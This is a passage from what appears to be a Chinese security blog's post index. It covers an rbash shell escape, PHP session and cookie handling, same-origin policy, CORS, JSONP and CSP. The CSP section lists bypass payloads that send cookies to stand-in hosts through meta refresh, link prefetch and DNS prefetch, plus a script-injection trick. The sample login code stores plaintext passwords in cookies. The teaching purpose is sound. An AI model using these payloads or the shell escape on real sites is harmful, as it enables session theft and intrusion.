df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。当时我们输入pwd的时候计算机首先去/bin中去查找，发现存在pwd命令，可以使用。 123BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;aexport PATH&#x3D;$PATH:&#x2F;binexport PATH&#x3D;$PATH:&#x2F;bin&#x2F;bash 所以我们在讲/bin/bash输入到PATH中，我们输入/bin/bash就会切换一个shell。进而达到了绕过rbash的目的。","categories":[{"name":"Linux提权","slug":"Linux提权","permalink":"http://s1eady.top/categories/Linux%E6%8F%90%E6%9D%83/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://s1eady.top/tags/Linux/"}]},{"title":"session、cookie原理","slug":"session、cookie原理","date":"2019-02-04T18:40:36.000Z","updated":"2020-10-16T11:46:56.900Z","comments":true,"path":"2019/02/05/session、cookie原理/","link":"","permalink":"http://s1eady.top/2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/","excerpt":"","text":"session、cookie原理登陆前session_start() 用户第一次访问文件(含有session_start函数的文件) 用户第一次访问是没有PHPSESSID,所以会创建$_SESSION变量,同时创建sess_abc123的session文件,将abc123作为PHPSESSID的值返回给浏览器 比如: 我们在从未提交过表单,也就是没有访问login.php,因此session_start函数不会触发,PHPSESSID也不会存在 cookie中不会存在任何PHPSESSID值 没有访问服务器之前,我们的请求是不会带上PHPSESSID的 用户提交表单到服务器(login.php),此时无论是否密码、账号是否正确,都会出发session_start函数,进而生成PHPSESSID值 然后我们在每一个请求服务器的时候都会带上PHPSESSID 登陆后登陆之后,通过以下代码设置cookie 12setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); 我们在前端可以使用js获取到cookie值 HttpOnly设置每个cookie都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过cookie选项来设置的，cookie选项包括：expires、domain、path、secure、HttpOnly。在设置任一个cookie时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**分号和一个空格**隔开。 这个选项用来设置cookie是否能通过 js 去访问。默认情况下，cookie不会带httpOnly选项(即为空)，所以默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）这个cookie。 注意:只有设置了setcookie的第七个参数为true的时候 document.cookie才是空的,即使在php.ini里面设置了session.cookie_httponly=On并且设置了session.cookie_httponly 这个属性(ini_set(&quot;session.cookie_httponly&quot;, 1);)，但是在浏览器还是能获取到cookie的信息,只要setcookie的第七个参数不设置为true,document.cookie依然能取到值。 源码login.html 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt; &lt;title&gt;会员登录&lt;&#x2F;title&gt; &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; ul li&#123;margin:0;padding:0;&#125; form&#123;margin:40px 30px 0;&#125; form li&#123;list-style:none;padding:5px 0;&#125; form li label&#123;float:left;width:70px;text-align:right&#125; form li a&#123;font-size:12px;color:#999;text-decoration:none&#125; .login_btn&#123;border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;&#125; form li img&#123;vertical-align:top&#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;用户登录&lt;&#x2F;legend&gt; &lt;ul&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt;用户名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt;密码:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;remember&quot; value&#x3D;&quot;yes&quot;&#x2F;&gt;7天内自动登录 &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;login&quot; value&#x3D;&quot;登录&quot; class&#x3D;&quot;login_btn&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; Login.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(isset($_POST[&#39;login&#39;])) &#123; $username &#x3D; trim($_POST[&#39;username&#39;]); $password &#x3D; trim($_POST[&#39;password&#39;]); if(($username&#x3D;&#x3D;&#39;&#39;)||($password&#x3D;&#x3D;&#39;&#39;)) &#123; header(&#39;refresh:3;url&#x3D;login.html&#39;); echo &quot;改用户名或密码不能为空，3秒后跳转到登录页面&quot;; exit; &#125; else if(($username!&#x3D;&#39;username&#39;)||($password!&#x3D;&#39;password&#39;)) &#123; &#x2F;&#x2F;用户名或密码错误 header(&#39;refresh:3;url&#x3D;login.html&#39;); echo &quot;用户名或密码错误，3秒后跳转到登录页面&quot;; exit; &#125; else if(($username&#x3D;&#x3D;&#39;username&#39;)&amp;&amp;($password&#x3D;&#x3D;&#39;password&#39;)) &#123; &#x2F;&#x2F;登录成功将信息保存到session中 $_SESSION[&#39;username&#39;]&#x3D;$username; $_SESSION[&#39;islogin&#39;]&#x3D;1; &#x2F;&#x2F;如果勾选7天内自动保存，则将其保存到cookie if($_POST[&#39;remember&#39;]&#x3D;&#x3D;&quot;yes&quot;) &#123; setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); &#125; else &#123; setcookie(&quot;username&quot;,&#39;&#39;,time()-1); setcookie(&quot;code&quot;,&#39;&#39;,time()-1); &#125; &#x2F;&#x2F;跳转到用户首页 header(&#39;refresh:3;url&#x3D;index.php&#39;); &#125; &#125; ?&gt; Index.php 1234567891011121314151617181920&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); session_start(); //首先判断Cookie是否有记住用户信息 if(isset($_COOKIE[&#x27;username&#x27;])) &#123; $_SESSION[&#x27;username&#x27;]=$_COOKIE[&#x27;username&#x27;]; $_SESSION[&#x27;islogin&#x27;]=1; &#125; if(isset($_SESSION[&#x27;islogin&#x27;])) &#123; //已经登录 echo $_SESSION[&#x27;username&#x27;].&quot;:你好，欢迎进入个人中心！&lt;br/&gt;&quot;; echo &quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;; &#125; else &#123; //为登录 echo &quot;你还未登录，请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;; &#125; ?&gt; Logout.php 12345678910111213&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); session_start(); //清除session $username=$_SESSION[&#x27;username&#x27;]; $_SESSION=array(); session_destroy(); //清除cookie setcookie(&quot;username&quot;,&#x27;&#x27;,time()-1); setcookie(&quot;code&quot;,&#x27;&#x27;,time()-1); echo &quot;$username,欢迎下次光临&quot;; echo &quot;重新&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;; ?&gt; session与cookie的区别Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器 网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies 。 cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力。 服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。 cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的 session机制是一种服务器端的机制，session由服务端生成，每一个session对应一个session id，session id将被在本次响应中返回给客户端保存，可以保存在cookie中。 1、存储方式不同 Cookie中只能保管ASCII字符串 Session中能够存取任何类型的数据 2、隐私策略的不同 Cookie存储在客户端阅读器中，对客户端是可见的，客户端的一些程序可能会窥探、复制以至修正Cookie中的内容。 Session存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险 3、跨域支持上的不同 Cookie支持跨域名访问 Session仅在他所在的域名内有效 4、cookie数据存放在客户的浏览器（客户端）上，session数据放在服务器上，但是服务端的session的实现对客户端的cookie有依赖关系的； 5、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session； session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE； 6、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K； cookie如何生成？1、由服务端生成，在返回包中的set-cookie选项设置cookie。 2、前端浏览器通过js设置cookie。 什么是session？Session是一种协议，是保持用户状态的协议 客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Cookie与Session","slug":"Cookie与Session","permalink":"http://s1eady.top/tags/Cookie%E4%B8%8ESession/"}]},{"title":"同源策略与CSP","slug":"同源策略与CSP","date":"2019-01-10T12:11:17.000Z","updated":"2020-10-16T11:46:27.581Z","comments":true,"path":"2019/01/10/同源策略与CSP/","link":"","permalink":"http://s1eady.top/2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/","excerpt":"","text":"同源策略什么是跨域?域:域是windows网络操作系统的逻辑组织单元,也是internet的逻辑组织单元.他是安全边界 只有域的所有者才能有权利去管理或者访问域内部的资源,若其他域要访问或者管理,则需要该域赋予其他域的相关权限。 网页跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。 同源策略同源是指域名、协议、端口相同 浏览器的同源策略主要有两个: DOM的同源策略:禁止对不同源页面的DOM元素进行操作,主要是在inframe标签加载跨域页面出现 XmlHttpRequests同源策略:禁止XHR对象对不同的源地址发起请求 存储在浏览器中的数据，如localStroage、Cooke和IndexedDB不能通过脚本跨域访问 Dom 同源策略Dom同源策略主要是防止你通过iframe标签引入恶意的网页,该网页能够窃取当前网站的cookie等重要信息,之所以是Dom同源策略,就是我们可以操作Dom来拿到重要信息,比如操作Dom元素拿到目标网站中的input标签中的内容，内容可能是密码、账号。 我们来看一个例子: 12345678 &lt;head&gt; &lt;title&gt;Siam - Dom同源策略&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.alipay.com&quot;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现，他拒绝了支付宝页面的展示,原因是没有设置请求头---X-Frame-Options,主要原因就是不同源(sameorigin) X-Frame-Options 是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内。 123X-Frame-Options: DENY &#x2F;&#x2F; 不允许iframeX-Frame-Options: SAMEORIGIN &#x2F;&#x2F; 只允许同源的网站iframeX-Frame-Options: ALLOW-FROM [http:&#x2F;&#x2F;yancoo.cn&#x2F;](https:&#x2F;&#x2F;links.jianshu.com&#x2F;go?to&#x3D;http%3A%2F%2Fyancoo.cn%2F) &#x2F;&#x2F; 只允许指定网站iframe XMLHttpRequest 同源策略XHR主要是防止获取用户cookie,防止攻击者进行跨站请求伪造 跨站请求原理: 1、用户登陆网站A,先要填写用户名、密码等cookie信息.然后信息保存在浏览器中 2、用户访问恶意网站B,(不知情的情况下)执行恶意网站的某些操作,而该操作会带上用户在浏览器端的cookie信息 去执行一些非法操作 3、站点A根据请求所带的cookie,判断该用户为合法的A用户,成功实现攻击者的目的 同源检测Origin Header具体流程 当一个链接或者XMLHttpRequest去请求跨域操作，浏览器事实上的确向目标服务器发起了连接请求，并且携带这origin。 请求首部字段 Origin 指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息。除了不包含路径信息（不包含path及query），该字段与 Referer 首部字段相似。 Referer Header具体流程 在发起请求前，调用window.localtion获取window.location.href获取当前地址栏中的请求地址 将该地址附加到referrer域中 判断请求头中的Referer字段，比如： 12345678910GET /pheapi/article/dir/89489609 HTTP/1.1Host: blog.csdn.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://blog.csdn.net/qq_36119192/article/details/89489609X-Requested-With: XMLHttpRequestX-Tingyun-Id: im-pGljNfnc;r=901833252Connection: close 以上场景出现在用户从https://blog.csdn.net/qq_36119192/article/details/89489609访问/pheapi/article/dir/89489609，目的页面可以通过请求头中的referer字段来判断是否是跨域请求。 两者区别origin只有发生跨域请求或者同域的post请求时候才会有。 referer不论何种情况下，只要浏览器能获取到请求源都会携带，携带着url的很多参数信息，而这些信息实际上是隐私的，但是外部网站都可以看到这些数据。 补天平台登录请求头 12345678910111213POST /user/sign-in?next=https://www.butian.net/Home/login/loginBack HTTP/1.1Host: user.butian.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: application/jsonAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/json; charset=UTF-8Content-Length: 208//可以看到referer没有带上path和queryOrigin: https://user.butian.netConnection: closeReferer: https://user.butian.net/user/sign-in?next=https://www.butian.net/login.html&amp;style=1Cookie: next=&quot;https%3A//www.butian.net/login.html&quot;; __q__=1601903202954; csrf_token=1601906836##158ab5b128d3781965424a7ece2f6cbe318bcf8f; style=1; User-Center=b8a5b564-f158-4af1-977d-6adf7105c2c9; btlc_ba52447ea424004a7da412b344e5e41a=e063dd212b16f71c690e97fa9aeaafc404be29448327bf57a72e50f675893d27 跨域的解决方法CORS 跨域解决它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。CORS的请求操作由浏览器自动执行,关键就是服务端的配置,来检测是否允许客户端进行访问。 CORS的原理: 使用http自定义头,请求头带上客户端的信息,服务端进行验证,返回响应信息告诉客户端目标资源是否允许被访问 两种请求简单请求必须同时满足以下两个条件的请求，才是简单请求 请求方法只能是在以下三种之中： 123GETPOSTHEAD HTTP的头信息不超出以下几种字段： 12345AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type 只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain 凡是不同时满足上面两个条件，就属于非简单请求。 非简单请求在发送真正请求之前，会先发送一次预检请求，来判断服务端是否支持非简单请求的类方法。预检通过之后，浏览器会再次使用真实请求方法发起请求 “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，”预检”请求的头信息包括两个特殊字段。 Access-Control-Request-Method 该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 三个与CORS请求相关的字段1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 Access-Control-Allow-Origin该字段是必须的，它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials该字段可选，它的值是一个布尔值，表示是否允许发送Cookie。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。 Access-Control-Expose-Headers该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值。 实践简单请求两个网站—www.siam.com和www.siam2.com sim向sim2发起请求 sim网站如下,使用ajax请求sim2: 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;首页1&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是原始页面的内容&lt;/h1&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(function()&#123; $.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125; &#125;) &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; sim2: 12&lt;?phpecho &quot;来自index2.php的内容&quot;; 访问sim2的时候: 1(index):1 Access to XMLHttpRequest at ‘[http://www.siam2.com/index2.php](http://www.siam2.com/index2.php)‘ from origin ‘[http://siam.com](http://siam.com/)‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. 很明显不允许进行跨域 因为我们的服务端–sim2没有进行相应的设置,接下来我们进行一下相应的设置: 响应头中增加字段，来添加信任站点的域名 123&lt;?phpheader(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);echo &quot;来自index2.php的内容&quot;; 这里就跨域请求成功了。 非简单请求因为简单请求必须是HEAD，GET，POST其一，所以我们这里直接使用PUT方法来测试就可以出现非简单请求的场景了。 当然你也可以自定义HTTP头部来实现非简单请求。 我们把index.html的ajax方法改为put 然后请求 1234567$.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125;&#125;) 可以看到在请求中，我们填的是PUT，但是这里产生的却是OPTIONS，前面我们也说了，非简单请求会先产生一次预检请求，带上origin和真实的方法在这里是PUT，服务端验证通过了origin和方法之后，浏览器才会使用真实的方法PUT发送一次请求。 我们还没有在服务端返回头部告诉浏览器说我们支持PUT方法，所以浏览器这里拿不到权限，报错了。 我们在服务端的代码添加头部 1234&lt;?phpheader(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);header(&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;); // 需要同意两种类型，就用逗号隔开echo &quot;来自index2.php的内容&quot;; 到这里就可以正常的请求了，但是可以在浏览器中看到，产生了两次请求，也就是说php脚本执行了两次。 我们例子中只是简单输出一个字符，如果是查询数据库等操作呢？ 是不是就多出了一次无用的请求。 所以我们可以在服务端拦截预检请求，直接返回同意访问的头部，后面的脚本就不需要执行了。 还有前面的简单请求，哪怕是还没有添加信任，跨域请求失败，脚本也一样会运行。 1这是因为http协议并没有跨域的概念，请求发送了就会执行，而到达了浏览器的时候，才由浏览器解析响应头，查看是否有相应的字段来决定要不要继续执行。 123456789101112&lt;?php// 如果不是同意的来源 就不用运行了if (strpos($_SERVER[&#x27;HTTP_ORIGIN&#x27;], &#x27;http://www.siam.com&#x27;) === false)&#123; die;&#125;header(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);// 如果是预检请求，则通知信任即可，不需要执行脚本。if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;OPTIONS&#x27;)&#123; header(&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;); die;&#125;echo &quot;来自index2.php的内容&quot;; 总的意思就是请求不是同意的来源以及请求是预检测我都不执行脚本 同时我们可以看一下，是否每一个非简单请求都需要先发送预检请求。我们在一个页面连续请求两次 1234567891011121314$.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); $.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125; &#125;) &#125;&#125;) 发现浏览器只有请求了3次：1次OPTIONS，2次PUT。 1在一个页面中，预检操作只需要进行一次。 12345优点CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。支持所有类型的 HTTP 请求。缺点第一次发送非简单请求时会多一次请求，增加服务器压力。 JSONP 跨域解决通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。 1234567&lt;script src=&quot;http://steady.com/data.php?callback=steady&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function steady(jsondata)&#123; //处理获得的json数据 &#125;&lt;/script&gt; 首先我们在html中写下以下代码，创建一个script，调用动态脚本 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Siam - script 同源解决&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是原始页面的内容&lt;/h1&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 这里需要先写好相应的回调处理函数，然后服务端的脚本调用 传参 function test(text)&#123; $(&#x27;body&#x27;).append(text); &#125; $(function()&#123; $(&quot;body&quot;).append(&quot;&lt;script src=&#x27;http://www.siam2.com/script.php&#x27;&gt;&lt;\\/script&gt;&quot;); &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 服务端脚本: 123&lt;?phpecho &quot;test(&#39;这是返回内容&#39;)&quot;;?&gt; 优点： 1它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。 缺点： 1它只支持&#96;GET&#96;请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。 服务器代理除了使用以上的两种方案，我们还可以在nginx配置反向代理，在www.siam.com下某个路径代理到www.siam2.com即可 我们打开nginx.conf 12345678910111213server &#123; listen 80; server_name www.siam.com; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; location ^~ /apis &#123; proxy_pass http://www.siam2.com; &#125;&#125; 通过反向代理，我们就可以通过 www.siam.com/apis/index2.php 这个路径来访问原来部署在www.siam2.com下的内容。 这样子就是同源请求了。 CSP概念​ CSP全称Content Security Policy ,可以直接翻译为内容安全策略,为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则,指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源），明确告诉客户端，哪些外部资源可以加载和执行。通过CSP协定，让WEB处于一个安全的运行环境中。 设置方式Content-Security-Policy一种是通过 HTTP 头信息的Content-Security-Policy的字段。 12Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;style-src cdn.example.org third-party.org; child-src https: &lt;meta&gt;1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; 上面代码中，CSP 做了如下配置。 12345脚本：只信任当前域名&lt;object&gt;标签：不信任任何URL，即不加载任何资源样式表：只信任cdn.example.org和third-party.org框架（frame）：必须使用HTTPS协议加载其他资源：没有限制 策略指令 指令 说明 default-src 定义资源默认加载策略 connect-src 定义 Ajax、WebSocket 等加载策略 font-src 定义 Font 加载策略 frame-src 定义 Frame 加载策略 img-src 定义图片加载策略 media-src 定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略 object-src 定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略 script-src 定义 JS 加载策略 style-src 定义 CSS 加载策略 sandbox 值为 allow-forms，对资源启用 sandbox report-uri 值为 /report-uri，提交日志 内容源 源 说明 * 通配符，允许任何URL，除了data: blob: filesystem: schemes *.foo.com 允许加载foo.com子域的资源 abc.foo.com 只能加载这个域名下的资源 https://a.com 只能用HTTPS加载域名下的资源 https: 通过HTTPS可以加载任意域名下的资源 ‘none’ 代表空集,即不匹配任何URL,两侧单引号是必须的 ‘self’ 代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的 ‘unsafe-inline’ 允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的 ‘unsafe-eval’ 允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的 data: 允许data: URI作为内容来源 mediastream: 允许mediastream: URI作为内容来源 例子1Content-Security-Policy: default-src &#39;self&#39; steady.foo.com 默认的内容源必须为同源或者是steady.foo.com nonce script CSP和strict-dynamicnonce script CSP1234&lt;?phpHeader(&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;.$random.&quot; &#x27;&quot;);?&gt;&lt;script nonce=&quot;&lt;?php echo $random?&gt;&quot;&gt; 这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。 strict-dynamic1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;strict-dynamic&#39; CSP Bypass的方法总结CSP对前端攻击的防御主要有两个： 限制js的执行。 限制对不可信域的请求。 绕过方式url跳转在default-src ‘none‘的情况下，可以使用meta标签实现跳转 1&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt; 在允许unsafe-inline的情况下 用window.location，或者window.open之类的方法进行跳转绕过 123&lt;script&gt; window.location&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;;&lt;&#x2F;script&gt; &lt;a&gt;标签配合站内的某些可控JS点击操作来跳转 1234&lt;script&gt; $(#foo).click()&lt;&#x2F;script&gt;&lt;a id&#x3D;&quot;foo&quot; href&#x3D;&quot;xxxxx.com&quot;&gt; 利用网站本身的跳转接口 1http:&#x2F;&#x2F;foo.com&#x2F;jmp.php?url&#x3D;attack.com &lt;link&gt;标签预加载CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据。 1&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt; 在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie 1&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt; 利用浏览器补全有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样 1Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39; 插入点 12&lt;p&gt;插入点&lt;&#x2F;p&gt;&lt;script nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt; payload 1&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot; 浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定 12&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;&lt;&#x2F;p&gt;&lt;script&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt; DVWA-CSP靶场src属性1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;myscripts.js&quot;&gt;&lt;&#x2F;script&gt; src 属性规定外部脚本文件的 URL。 有时，我们需要在网站的多个页面中运行 JavaScript。不需要重复编写相同的脚本，只需在单独的文件中创建 JavaScript，并以 .js 为后缀保存，然后使用&lt;script&gt; 标签中的 src 属性引用该文件即可。 注释：外部文件不能包含 &lt;script&gt; 标签！ Low源码分析 123456789101112131415161718192021222324252627&lt;?php//定义script脚本执行策略，可以看到只允许本域、以及一下网站https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, 